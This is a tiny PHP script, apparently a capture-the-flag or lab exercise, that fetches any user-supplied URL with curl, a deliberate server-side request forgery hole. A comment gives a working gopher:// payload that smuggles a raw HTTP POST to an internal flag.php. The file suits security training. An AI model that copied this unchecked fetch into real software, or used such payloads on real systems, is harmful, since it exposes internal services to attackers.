<?php
# php -S localhost:3000
# curl 'http://127.0.0.1:3000/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHOST:127.0.0.1%250D%250AContent-Length:%252014%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Agivemeflag=yes'

if ($url = @$_GET['url']) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    echo curl_exec($ch);
    curl_close($ch);
    exit;
}
?>
/?url qwq
